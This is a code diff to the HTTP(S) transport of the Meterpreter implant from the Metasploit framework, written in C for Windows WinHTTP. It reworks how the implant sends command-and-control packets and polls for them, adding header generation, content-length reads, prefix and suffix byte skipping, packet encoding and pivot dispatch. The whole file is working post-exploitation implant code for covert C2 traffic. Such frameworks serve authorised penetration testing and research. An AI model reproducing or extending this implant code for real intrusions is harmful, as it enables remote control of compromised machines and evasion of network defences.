@@ -224,58 +224,22 @@ static BOOL write_to_request(HANDLE hReq, LPVOID buffer, DWORD size)
  * @brief Wrapper around WinHTTP-specific sending functionality.
  * @param ctx Pointer to the current HTTP transport context.
  * @param hReq HTTP request handle.
- * @param isGet Specifies if this request is a GET request (compared to POST).
+ * @param conn Pointer to the GET/POST connection config.
  * @param buffer Pointer to the buffer to receive the data.
  * @param size Buffer size.
  * @return An indication of the result of sending the request.
  */
-static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, BOOL isGet, LPVOID buffer, DWORD size)
+static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, HttpConnection* conn, LPVOID buffer, DWORD size)
 {
-	PWSTR headers = ctx->default_options.headers;
-	HttpConnection* conn = isGet ? &ctx->get_connection : &ctx->post_connection;
-
-	if (conn->options.headers)
-	{
-		headers = conn->options.headers;
-	}
-
-	PWSTR outboundHeaders = NULL;
-	PWSTR uuidHeader = conn->options.uuid_header ? conn->options.uuid_header : ctx->default_options.uuid_header;
-	if (uuidHeader)
-	{
-		// UUID is going in the header, so we need to add it. Let's hope people aren't
-		// stupid enough to double-up this header. Length needs to include space for \r\n and the colon/space,
-		// AND the UUID length itself.
-		size_t extraHeaderLength = wcslen(uuidHeader) + 2 + wcslen(ctx->uuid) + 2;
-		size_t totalHeaderLength = extraHeaderLength + (headers ? wcslen(headers) : 0) + 2;
-		outboundHeaders = (PWCHAR)calloc(totalHeaderLength, sizeof(wchar_t));
-
-		if (headers)
-		{
-			wcscat_s(outboundHeaders, totalHeaderLength, headers);
-			wcscat_s(outboundHeaders, totalHeaderLength, L"\r\n");
-		}
-		wcscat_s(outboundHeaders, totalHeaderLength, uuidHeader);
-		wcscat_s(outboundHeaders, totalHeaderLength, L": ");
-		wcscat_s(outboundHeaders, totalHeaderLength, ctx->uuid);
-	}
-	else if (headers)
-	{
-		outboundHeaders = _wcsdup(headers);
-	}
-
-	if (outboundHeaders)
-	{
-		dprintf("[WINHTTP] Outbound headers for this request: %S", outboundHeaders);
-	}
-
-	DWORD headerLength = outboundHeaders == NULL ? 0 : -1L;
-	DWORD totalSize = size + conn->options.payload_prefix_size + conn->options.payload_suffix_size;
-
 	BOOL result = FALSE;
 
+	PWSTR headers = generate_headers(ctx, conn);
+	DWORD headerLength = headers == NULL ? 0 : -1L;
+
+	DWORD totalSize = size + conn->options.payload_prefix_size + conn->options.payload_suffix_size;
+
 	// Start a request without including any data
-	if (WinHttpSendRequest(hReq, outboundHeaders, headerLength, NULL, 0, totalSize, 0))
+	if (WinHttpSendRequest(hReq, headers, headerLength, NULL, 0, totalSize, 0))
 	{
 		dprintf("[WINHTTP] Sending prefix");
 		// Then write the prefix first
@@ -296,7 +260,7 @@ static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, BOOL is
 		dprintf("[WINHTTP] WinHttpSendRequestFailed: %u 0x%x", GetLastError(), GetLastError());
 	}
 
-	SAFE_FREE(outboundHeaders);
+	SAFE_FREE(headers);
 
 	return result;
 }
@@ -315,9 +279,10 @@ static BOOL receive_response_winhttp(HANDLE hReq)
  * @brief Wrapper around WinHTTP-specific request response validation.
  * @param hReq HTTP request handle.
  * @param ctx The HTTP transport context.
+ * @param contentLength Pointer to a DWORD receiving the content length of the response.
  * @return An indication of the result of getting a response.
  */
-static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
+static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, LPDWORD contentLength)
 {
 	DWORD statusCode;
 	DWORD statusCodeSize = sizeof(statusCode);
@@ -383,14 +348,18 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
 		}
 	}
 
-	return ERROR_SUCCESS;
+	// if we get here, then we should be good to look at the content length
+	DWORD size = sizeof(DWORD);
+
+	WinHttpQueryHeaders(hReq, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
+		WINHTTP_HEADER_NAME_BY_INDEX, contentLength, &size, WINHTTP_NO_HEADER_INDEX);
+	return GetLastError();
 }
 
 /*!
- * @brief Windows-specific function to transmit a packet via HTTP(s) using winhttp _and_ destroy it.
+ * @brief Transmit a packet via HTTP(s) using winhttp _and_ destroy it.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
  * @return An indication of the result of processing the transmission request.
  */
 static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
@@ -399,6 +368,10 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 	HINTERNET hReq;
 	BOOL res;
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+	LPBYTE encodedPacket = NULL;
+	DWORD encodedPacketLength = 0;
+
+	BOOL freeEncodedPacket = encode_raw_packet(ctx, rawPacket, rawPacketLength, &encodedPacket, &encodedPacketLength);
 
 	lock_acquire(remote->lock);
 
@@ -411,7 +384,7 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 		}
 
 		dprintf("[PACKET TRANSMIT HTTP] Request created, sending via POST");
-		res = ctx->send_req(ctx, hReq, FALSE, rawPacket, rawPacketLength);
+		res = ctx->send_req(ctx, hReq, &ctx->post_connection, encodedPacket, encodedPacketLength);
 		if (!res)
 		{
 			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed send_req");
@@ -429,47 +402,43 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 
 	ctx->close_req(hReq);
 
+	if (freeEncodedPacket)
+	{
+		SAFE_FREE(encodedPacket);
+	}
+
 	lock_release(remote->lock);
 
 	return dwResult;
 }
 
 /*!
- * @brief Windows-specific function to receive a new packet via one of the HTTP libs (WinInet or WinHTTP).
+ * @brief Receive a new packet via one of the HTTP libs (WinInet or WinHTTP).
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to a pointer that will receive the \c Packet data.
  * @return An indication of the result of processing the transmission request.
  */
 static DWORD packet_receive_http(Remote *remote, Packet **packet)
 {
-	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
-	Packet *localPacket = NULL;
-	PacketHeader header;
-	DWORD bytesRead;
-	BOOL inHeader = TRUE;
-	PUCHAR packetBuffer = NULL;
-	ULONG payloadLength;
+	DWORD result = ERROR_SUCCESS;
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
-
-	HINTERNET hReq;
-	BOOL hRes;
 	DWORD retries = 5;
 
 	lock_acquire(remote->lock);
 
-	hReq = ctx->create_req(ctx, TRUE, "PACKET RECEIVE");
+	HINTERNET hReq = ctx->create_req(ctx, TRUE, "PACKET RECEIVE");
 	if (hReq == NULL)
 	{
+		result = GetLastError();
 		goto out;
 	}
 
 	vdprintf("[PACKET RECEIVE HTTP] sending GET");
-	hRes = ctx->send_req(ctx, hReq, TRUE, NULL, 0);
 
-	if (!hRes)
+	if (!ctx->send_req(ctx, hReq, &ctx->get_connection, NULL, 0))
 	{
 		dprintf("[PACKET RECEIVE HTTP] Failed send_req: %d %d", GetLastError(), WSAGetLastError());
-		SetLastError(ERROR_NOT_FOUND);
+		result = ERROR_NOT_FOUND;
 		goto out;
 	}
 
@@ -477,150 +446,99 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 	if (ctx->receive_response && !ctx->receive_response(hReq))
 	{
 		vdprintf("[PACKET RECEIVE] Failed receive: %d", GetLastError());
-		SetLastError(ERROR_NOT_FOUND);
+		result = ERROR_NOT_FOUND;
 		goto out;
 	}
 
-	SetLastError(ctx->validate_response(hReq, ctx));
-
-	if (GetLastError() != ERROR_SUCCESS)
+	DWORD contentLength = 0;
+	result = ctx->validate_response(hReq, ctx, &contentLength) != ERROR_SUCCESS;
+	if (result != ERROR_SUCCESS)
 	{
+		vdprintf("[PACKET RECEIVE] Validation failed: %d", result);
+		goto out;
+	}
+	dprintf("[PACKET RECEIVE] Response is valid, content length is: %d", contentLength);
+
+	if (contentLength == 0)
+	{
+		dprintf("[PACKET RECEIVE] No data in body, bailing out");
+		result = ERROR_EMPTY;
 		goto out;
 	}
 
-	UINT skipCount = ctx->get_connection.options.payload_skip_count;
-	if (skipCount == 0)
+	DWORD bytesRead = 0;
+	DWORD bytesTotal = 0;
+	LPBYTE body = (LPBYTE)calloc(contentLength, sizeof(BYTE));
+	while (bytesTotal < contentLength && retries > 0)
 	{
-		skipCount = ctx->default_options.payload_skip_count;
-	}
+		dprintf("[PACKET RECEIVE] Trying to read bytes: %d", contentLength - bytesTotal);
 
-	vdprintf("[PACKET RECEIVE HTTP] Skipping GET bytes: %u", skipCount);
-	retries = 3;
-	while (skipCount > 0 && retries > 0)
-	{
-		DWORD bytesRead = 0;
-		BYTE buf[100] = { 0 };
-		ctx->read_response(hReq, buf, min(skipCount, sizeof(buf)), &bytesRead);
-		vdprintf("[PACKET RECEIVE HTTP] Skipped bytes: %u", bytesRead);
-		skipCount -= bytesRead;
+		if (!ctx->read_response(hReq, body + bytesTotal, contentLength - bytesTotal, &bytesRead))
+		{
+			dprintf("[PACKET RECEIVE HTTP] Failed read_response: %d", GetLastError());
+			result = ERROR_NOT_FOUND;
+			goto out;
+		}
+
 		if (bytesRead == 0)
 		{
 			--retries;
-		}
-	}
-
-	if (skipCount > 0)
-	{
-		// we didn't receive all the data to skip first, which means there's either a problem
-		// or there's nothing at all for us to do.
-		SetLastError(ERROR_NOT_FOUND);
-		goto out;
-	}
-
-	// Read the packet length
-	retries = 3;
-	vdprintf("[PACKET RECEIVE HTTP] Start looping through the receive calls");
-	while (inHeader && retries > 0)
-	{
-		retries--;
-		if (!ctx->read_response(hReq, (PUCHAR)&header + headerBytes, sizeof(PacketHeader)-headerBytes, &bytesRead))
-		{
-			dprintf("[PACKET RECEIVE HTTP] Failed HEADER read_response: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			goto out;
-		}
-
-		vdprintf("[PACKET RECEIVE HTTP] Data received: %u bytes", bytesRead);
-
-		// If the response contains no data, this is fine, it just means the
-		// remote side had nothing to tell us. Indicate this through a
-		// ERROR_EMPTY response code so we can update the timestamp.
-		if (bytesRead == 0)
-		{
-			SetLastError(ERROR_EMPTY);
-			goto out;
-		}
-
-		headerBytes += bytesRead;
-
-		if (headerBytes != sizeof(PacketHeader))
-		{
 			continue;
 		}
-
-		inHeader = FALSE;
+		bytesTotal += bytesRead;
 	}
 
-	if (headerBytes != sizeof(PacketHeader))
+	if (bytesTotal != contentLength)
 	{
-		dprintf("[PACKET RECEIVE HTTP] headerBytes not valid");
-		SetLastError(ERROR_NOT_FOUND);
+		vdprintf("[PACKET RECEIVE] Failed read response: %d", GetLastError());
+		result = ERROR_NOT_FOUND;
 		goto out;
 	}
 
-	dprintf("[PACKET RECEIVE HTTP] decoding header");
-	PacketHeader encodedHeader;
-	memcpy(&encodedHeader, &header, sizeof(PacketHeader));
-	xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
+	dprintf("[PACKET RECEIVE HTTP] Content has been read.");
+
+	// if there's data to skip at the start of the response, move the packet data
+	// to the front of the buffer
+	UINT skipCount = ctx->get_connection.options.payload_prefix_skip;
+	if (skipCount == 0)
+	{
+		skipCount = ctx->default_options.payload_prefix_skip;
+	}
+	dprintf("[PACKET RECEIVE HTTP] Skipping prefix bytes: %d", skipCount);
+	if (skipCount > 0)
+	{
+		memmove_s(body, contentLength, body + skipCount, contentLength - skipCount);
+		contentLength -= skipCount;
+	}
+
+	// Then adjust the length to consider based on the suffix skip
+	skipCount = ctx->get_connection.options.payload_suffix_skip;
+	if (skipCount == 0)
+	{
+		skipCount = ctx->default_options.payload_suffix_skip;
+	}
+	dprintf("[PACKET RECEIVE HTTP] Skipping suffix bytes: %d", skipCount);
+	contentLength -= skipCount;
+
+	if (contentLength == 0)
+	{
+		// After stripping our prefix/suffix, we have nothing left.
+		dprintf("[PACKET RECEIVE] No data in body post-skipping, bailing out");
+		result = ERROR_EMPTY;
+		goto out;
+	}
+
+	// The packet data has been read, but could be encoded based on the C2, so decode it first
+	LPBYTE packetData = NULL;
+	DWORD packetDataSize = 0;
+	BOOL freePacketData = decode_encoded_packet(ctx, body, contentLength, &packetData, &packetDataSize);
+
+	// We're now ready to handle the packet directly. Check the header info before we move forward.
+	PacketHeader header = *(PacketHeader*)packetData;
+	xor_bytes(header.xor_key, (PBYTE)&header + sizeof(header.xor_key), sizeof(header) - sizeof(header.xor_key));
 
 #ifdef DEBUGTRACE
-	PUCHAR h = (PUCHAR)&header;
-	vdprintf("[HTTP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
-		   h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
-#endif
-
-	payloadLength = ntohl(header.length) - sizeof(TlvHeader);
-	vdprintf("[REC HTTP] Payload length is %d", payloadLength);
-	DWORD packetSize = sizeof(PacketHeader) + payloadLength;
-	vdprintf("[REC HTTP] total buffer size for the packet is %d", packetSize);
-	payloadBytesLeft = payloadLength;
-
-	// Allocate the payload
-	if (!(packetBuffer = (PUCHAR)calloc(1, packetSize)))
-	{
-		dprintf("[REC HTTP] Failed to create the packet buffer");
-		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-		goto out;
-	}
-	dprintf("[REC HTTP] Allocated packet buffer at %p", packetBuffer);
-
-	// Copy the packet header stuff over to the packet
-	memcpy_s(packetBuffer, sizeof(PacketHeader), (LPBYTE)&encodedHeader, sizeof(PacketHeader));
-
-	LPBYTE payload = packetBuffer + sizeof(PacketHeader);
-
-	// Read the payload
-	retries = payloadBytesLeft;
-	while (payloadBytesLeft > 0 && retries > 0)
-	{
-		vdprintf("[PACKET RECEIVE HTTP] reading more data from the body...");
-		retries--;
-		if (!ctx->read_response(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))
-		{
-			dprintf("[PACKET RECEIVE] Failed BODY read_response: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			goto out;
-		}
-
-		if (!bytesRead)
-		{
-			vdprintf("[PACKET RECEIVE HTTP] no bytes read, bailing out");
-			SetLastError(ERROR_NOT_FOUND);
-			goto out;
-		}
-
-		vdprintf("[PACKET RECEIVE HTTP] bytes read: %u", bytesRead);
-		payloadBytesLeft -= bytesRead;
-	}
-
-	// Didn't finish?
-	if (payloadBytesLeft)
-	{
-		goto out;
-	}
-
-#ifdef DEBUGTRACE
-	h = (PUCHAR)&header.session_guid[0];
+	PUCHAR h = (PUCHAR)&header.session_guid[0];
 	dprintf("[HTTP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
 		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
 #endif
@@ -628,7 +546,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 	if (is_null_guid(header.session_guid) || memcmp(remote->session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
 	{
 		dprintf("[HTTP] Session GUIDs match (or packet guid is null), decrypting packet");
-		SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
+		result = decrypt_packet(remote, packet, packetData, packetDataSize);
 	}
 	else
 	{
@@ -637,10 +555,10 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 		if (pivotCtx != NULL)
 		{
 			dprintf("[HTTP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
-			SetLastError(pivot_packet_dispatch(pivotCtx, packetBuffer, packetSize));
+			result = pivot_packet_dispatch(pivotCtx, packetData, packetDataSize);
 
 			// mark this packet buffer as NULL as the thread will clean it up
-			packetBuffer = NULL;
+			packetData = NULL;
 			*packet = NULL;
 		}
 		else
@@ -649,18 +567,14 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 		}
 	}
 
-out:
-	res = GetLastError();
-
-	dprintf("[HTTP] Cleaning up");
-	SAFE_FREE(packetBuffer);
-
-	// Cleanup on failure
-	if (res != ERROR_SUCCESS)
+	if (freePacketData)
 	{
-		SAFE_FREE(localPacket);
+		SAFE_FREE(packetData);
 	}
 
+out:
+
+	dprintf("[HTTP] Cleaning up");
 	if (hReq)
 	{
 		ctx->close_req(hReq);
@@ -670,9 +584,17 @@ out:
 
 	dprintf("[HTTP] Packet receive finished");
 
-	return res;
+	return result;
 }
 
+/*!
+ * @brief Initialise a connection to a remote web server using WinHTTP.
+ * @param ctx Pointer to the current \c HttpTransportContext.
+ * @param conn Pointer to the \c HttpConnection config.
+ * @param host Name of the host to connect to.
+ * @param port Port number to connect on.
+ * @return Indication of success or failure.
+ */
 static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* conn, PWSTR host, INTERNET_PORT port)
 {
 	// configure proxy
@@ -755,6 +677,12 @@ static DWORD server_init_winhttp(Transport* transport)
 	return result;
 }
 
+/*!
+ * @brief Close off any connection resource handles.
+ * @param ctx Pointer ot the current \c HttpTransportContext.
+ * @param conn Pointer ot the current \c HttpConnection.
+ * @return Indication of success or failure.
+ */
 static void close_connection(HttpTransportContext* ctx, HttpConnection* conn)
 {
 	if (conn != NULL)
@@ -774,7 +702,7 @@ static void close_connection(HttpTransportContext* ctx, HttpConnection* conn)
 
 /*!
  * @brief Deinitialise the HTTP(S) connection.
- * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
+ * @param transport Pointer to the current \c Transport instance with the HTTP(S) transport details wired in.
  * @return Indication of success or failure.
  */
 static DWORD server_deinit_http(Transport* transport)
@@ -913,6 +841,10 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 	return result;
 }
 
+/*!
+ * @brief Destroy any configured HTTP options for the given request.
+ * @param options Pointer to the \c HttpRequestOptions to clean up.
+ */
 static void destroy_options(HttpRequestOptions* options)
 {
 	SAFE_FREE(options->ua);
@@ -969,6 +901,12 @@ static void transport_destroy_http(Transport* transport)
 	}
 }
 
+/*!
+ * @brief Write the given set of request options to the given TLV packet.
+ * @param optionsPacket Pointer to the \c Packet to write all the TLV data to.
+ * @param sourceOptions Pointer to the \c HttpRequestOptions that needs to be written.
+ * @returns Indication of success or failure.
+ */
 BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOptions)
 {
 	if (sourceOptions->encode_flags != 0)
@@ -983,9 +921,13 @@ BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOp
 	{
 		packet_add_tlv_raw(optionsPacket, TLV_TYPE_C2_PREFIX, sourceOptions->payload_prefix, sourceOptions->payload_prefix_size);
 	}
-	if (sourceOptions->payload_skip_count > 0)
+	if (sourceOptions->payload_prefix_skip > 0)
 	{
-		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_SKIP_COUNT, sourceOptions->payload_skip_count);
+		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_PREFIX_SKIP, sourceOptions->payload_prefix_skip);
+	}
+	if (sourceOptions->payload_suffix_skip > 0)
+	{
+		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_SUFFIX_SKIP, sourceOptions->payload_suffix_skip);
 	}
 	if (sourceOptions->payload_suffix != NULL && sourceOptions->payload_suffix_size > 0)
 	{
@@ -1015,6 +957,11 @@ BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOp
 	return TRUE;
 }
 
+/*!
+ * @brief Serialize the current transport to the given C2 packet.
+ * @param transport Pointer to the current \c Transport.
+ * @param c2Packet Pointer to the \c Packet to write all the TLV data to.
+ */
 void transport_write_http_config(Transport* transport, Packet* c2Packet)
 {
 	if (transport->type == METERPRETER_TRANSPORT_HTTP || transport->type == METERPRETER_TRANSPORT_HTTPS)
@@ -1056,13 +1003,21 @@ void transport_write_http_config(Transport* transport, Packet* c2Packet)
 	}
 }
 
+/*!
+ * @brief Read HTTP configuration options from a TLV packet.
+ * @param packet Pointer to the \c Packet containing the TLV data.
+ * @param optionsTlv Pointer to the \c Tlv group to read the options from.
+ * @param targetOptions Pointer to the \c HttpRequestOptions instance to populate.
+ * @returns Indication of success or failure.
+ */
 BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptions* targetOptions)
 {
 	targetOptions->encode_flags = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_ENC);
 	targetOptions->headers = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_HEADERS, NULL);
 	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_PREFIX, &targetOptions->payload_prefix_size);
-	targetOptions->payload_skip_count = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SKIP_COUNT);
+	targetOptions->payload_prefix_skip = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_PREFIX_SKIP);
 	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, &targetOptions->payload_suffix_size);
+	targetOptions->payload_suffix_skip = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SUFFIX_SKIP);
 	targetOptions->ua = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UA, NULL);
 	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
 	targetOptions->uuid_cookie = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_COOKIE, NULL);
@@ -1072,6 +1027,14 @@ BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptio
 	return TRUE;
 }
 
+/*!
+ * @brief Read HTTP request configuration options from a TLV packet.
+ * @param packet Pointer to the \c Packet containing the TLV data.
+ * @param c2Tlv Pointer to the \c Tlv that contains the options TLV data
+ * @param tlvType Identifies the TLV group type that contains the options to read.
+ * @param targetOptions Pointer to the \c HttpRequestOptions instance to populate.
+ * @returns Indication of success or failure.
+ */
 BOOL get_http_options_from_config(Packet* packet, Tlv* c2Tlv, UINT tlvType, HttpRequestOptions* targetOptions)
 {
 	Tlv optionsTlv = { 0 };
@@ -1090,7 +1053,8 @@ static void debug_print_http_options(PSTR type, HttpRequestOptions* options)
 	dprintf("[HTTP OPTION] - %s - Payload Prefix: %s", type, options->payload_prefix);
 	dprintf("[HTTP OPTION] - %s - Payload Suffix Size: %u", type, options->payload_suffix_size);
 	dprintf("[HTTP OPTION] - %s - Payload Suffix: %s", type, options->payload_suffix);
-	dprintf("[HTTP OPTION] - %s - Skip Byte Count: %u", type, options->payload_skip_count);
+	dprintf("[HTTP OPTION] - %s - Prefix Skip: %u", type, options->payload_prefix_skip);
+	dprintf("[HTTP OPTION] - %s - Suffix Skip: %u", type, options->payload_suffix_skip);
 	dprintf("[HTTP OPTION] - %s - URI: %S", type, options->uri);
 	dprintf("[HTTP OPTION] - %s - UUID Cookie: %S", type, options->uuid_cookie);
 	dprintf("[HTTP OPTION] - %s - UUID Get: %S", type, options->uuid_get);
